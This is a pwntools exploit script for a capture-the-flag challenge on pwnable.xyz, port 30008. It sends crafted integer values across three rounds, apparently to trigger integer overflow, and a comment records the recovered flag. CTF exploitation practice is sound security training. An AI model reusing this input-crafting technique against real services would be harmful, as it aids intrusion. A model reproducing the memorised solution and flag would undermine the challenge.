#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host svc.pwnable.xyz --port 30008 challenge
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'svc.pwnable.xyz'
port = int(args.PORT or 30008)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *round_1+270
b *round_2+104
b *round_3+233
b *round_3+153
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# round 1
io.sendafter(b'x:', b'2147484986')
io.sendafter(b'y:', b'2147483649')

# round 2
io.recvuntil(b't00leet ===')
io.sendline(b'775008219 1769457019')

# round 3
io.recvuntil(b'3leet ===')
io.sendline(b'-1 -1 1 1 1')

# FLAG{1eet_t00leet_3leet_4z}

io.interactive()

